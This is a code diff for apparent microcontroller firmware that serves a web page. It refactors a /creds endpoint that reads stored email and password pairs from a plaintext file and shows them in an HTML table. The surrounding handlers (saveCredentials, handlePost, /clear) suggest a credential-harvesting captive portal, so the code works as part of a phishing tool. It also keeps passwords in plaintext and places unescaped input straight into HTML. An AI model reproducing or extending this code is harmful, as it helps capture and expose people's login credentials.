@@ -85,30 +85,58 @@ void saveCredentials(String email, String password) {
   Serial.println("Credentials saved: " + formattedData);
 }
 
-void getCredentials() {
-  File file = SPIFFS.open("/credentials.txt", "r");
+String getCredentials() {
+  // Open the credentials file
+  File credentialsFile = SPIFFS.open("/credentials.txt", "r");
+  if (!credentialsFile) {
+    return "<p>Error: Unable to open credentials file.</p>";
+  }
+
+  String tableRows = "";
+  while (credentialsFile.available()) {
+    String line = credentialsFile.readStringUntil('\n');
+    int commaIndex = line.indexOf(',');
+    if (commaIndex != -1) {
+      String email = line.substring(0, commaIndex);
+      String password = line.substring(commaIndex + 1);
+      tableRows += "<tr><td>" + email + "</td><td>" + password + "</td></tr>\n";
+    }
+  }
+  credentialsFile.close();
+
+  if (tableRows == "") {
+    return "<p>No credentials found.</p>";
+  }
+
+  return tableRows;  // Return the rows for the table
+
+}
+
+void displayCredentials() {
+  // Read static HTML template from SPIFFS
+  File file = SPIFFS.open("/credentials.html", "r");
   if (!file) {
-    webServer.send(500, "text/html", "Failed to open credentials file.");
+    webServer.send(500, "text/html", "Failed to load the HTML template.");
     return;
   }
 
-  String pageContent = "<!DOCTYPE html><html><body>";
-  pageContent += "<h1>Saved Credentials</h1><table border='1'>";
-  pageContent += "<tr><th>Email</th><th>Password</th></tr>";
-  
-  while (file.available()) {
-    String line = file.readStringUntil('\n');  // Read one line at a time
-    int separatorIndex = line.indexOf(',');
-    if (separatorIndex > 0) {
-      String email = line.substring(0, separatorIndex);
-      String password = line.substring(separatorIndex + 1);
-      pageContent += "<tr><td>" + email + "</td><td>" + password + "</td></tr>";
-    }
+  String pageContent = file.readString();  // Read the entire HTML file into a String
+  file.close();
+
+  // Call getCredentials to retrieve the table rows with data
+  String tableRows = getCredentials();
+
+  // If credentials are not found, send an appropriate message
+  if (tableRows == "<p>Error: Unable to open credentials file.</p>") {
+    webServer.send(500, "text/html", tableRows);
+    return;
   }
 
-  pageContent += "</table></body></html>";
-  file.close();
-  return pageContent;
+  // Insert the rows into the table body in the HTML content
+  pageContent.replace("<tbody id=\"tableBody\"></tbody>", "<tbody id=\"tableBody\">" + tableRows + "</tbody>");
+
+  // Send the complete page with credentials table
+  webServer.send(200, "text/html", pageContent);
 }
 
 void handlePost() {
@@ -140,10 +168,7 @@ void setup() {
   }
 
   webServer.on("/post", HTTP_POST, handlePost);
-  webServer.on("/creds", HTTP_GET, []() {
-    String pageContent = getCredentials();
-    webServer.send(200, "text/html", pageContent);
-  });
+  webServer.on("/creds", HTTP_GET, displayCredentials);
   webServer.on("/clear", []() {
     webServer.send(200, "text/html", clear());
   });
